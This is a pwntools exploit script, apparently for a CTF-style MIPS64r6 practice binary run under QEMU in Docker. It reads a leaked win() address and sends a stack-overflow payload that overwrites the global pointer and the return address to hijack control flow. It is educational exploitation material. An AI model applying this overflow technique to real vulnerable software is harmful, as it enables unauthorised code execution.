from pwn import *


# initialize the binary
build = 'mips64r6-glibc-n32'
binary = "mips64r6_pie_n32"
elf = context.binary = ELF("../binaries/"+binary, checksec=False)
docker = ELF('/usr/bin/docker',checksec=False)

gs = """
set architecture mips:isa64r6
break main
continue
"""

if args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    p = docker.process(['run','-i','--rm','-v','../binaries:/target/ctf','-p','1234:1234','--name',binary,f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','-g','1234','/ctf/'+binary])
    print("Remote debugging started...")
    gdb.attach(("127.0.0.1",1234), gdbscript=gs, exe="../binaries/"+binary)
else:
    p = docker.process(['run','-i','--rm','-v','../binaries:/target/ctf','--name',binary,f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','/ctf/'+binary])


### EXPLOIT ###
win_addr = int(p.readline().strip(),16)
print(f'win(): {hex(win_addr)}')

payload = flat(
    b'a'*0x28,
    p64(win_addr+0x27760),          # set $gp
    b'b'*0x8,
    p64(win_addr+32)                # return to win() + 32 bytes to avoid setting $gp
)
p.sendline(payload)
p.interactive()
p.close()


### CLEANUP ###
print('[+] Removing docker container...')
subprocess.getoutput('docker stop ' + binary+' && docker rm ' + binary)